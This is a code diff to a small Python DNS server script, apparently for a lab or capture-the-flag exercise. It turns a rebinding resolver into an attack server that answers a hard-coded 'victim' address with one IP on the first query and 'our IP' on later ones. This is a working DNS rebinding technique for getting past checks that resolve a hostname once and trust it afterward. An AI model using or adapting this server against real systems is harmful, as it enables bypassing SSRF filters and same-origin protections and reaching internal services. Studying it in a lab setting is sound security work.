@@ -30,21 +30,28 @@ class DNSQuery:
 
 if __name__ == '__main__':
 	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	udp.bind(('',53))
+	udp.bind(('',54))
 
+	firstRequest = True # Track if first request
+	ip = "127.0.0.1" # Default IP
 	try:
 		while 1:
 			data, addr = udp.recvfrom(1024)
+			print "Got request from: ", addr[0]
 			p = DNSQuery(data)
+
 			# only IN A questions are supported
 			if p.domain and p.qtype == 1:
-				d = p.domain.split('.')
-				# basic validation
-				if len(d) >= 4:
-					if len(d[0].split('-')) == 4 and len(d[1].split('-')) == 4:
-						ip = d[int(time()) % 2].replace('-', '.')
-						print '%s -> %s' % (p.domain, ip)
-						udp.sendto(p.reply(ip), addr)
+				if addr[0] == "127.0.0.1": # if request from victim IP
+					print "Got request from victim"
+					
+					if firstRequest: # First request, send fake IP the victim expects/wants
+						ip = "10.10.10.10"
+						firstRequest = False
+					else: # if its the second request send our IP
+						ip = "11.11.11.11"
+					print '%s -> %s' % (p.domain, ip)
+				udp.sendto(p.reply(ip), addr)
 
 	except KeyboardInterrupt:
 		udp.close()
